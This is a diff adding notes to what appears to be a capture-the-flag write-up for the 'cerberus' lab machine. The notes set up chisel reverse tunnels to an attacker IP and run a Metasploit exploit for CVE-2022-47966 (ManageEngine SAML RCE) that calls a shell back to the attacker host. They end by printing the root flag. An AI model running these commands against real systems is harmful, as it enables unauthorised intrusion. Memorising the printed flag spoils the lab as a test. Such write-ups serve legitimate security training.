@@ -324,3 +324,35 @@ https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVPLbtswELz3KwTerQetyDJhKXDtBjXgt
 
 its not working 
 lets try withot proxychains once
+
+./chisel client 10.10.16.24:8001 R:5985:172.16.22.1:5985
+./chisel server -p 8001 — reverse
+
+.\chisel.exe client 10.10.16.24:9095 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
+./chisel server -p 9095 -reverse
+
+finally got the access
+
+![](20230627034915.png)
+
+we got the guid after login as 
+
+https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+
+
+msfconsole
+`use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966`
+set issuer_url http://dc.cerberus.local/adfs/services/trust
+set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+set rhosts 127.0.0.1
+set lhost 10.10.16.24
+set lport 7777
+exploit
+
+![](20230627035713.png)
+
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+140d0c42a9b55e680d42a2d873ea72d6
+
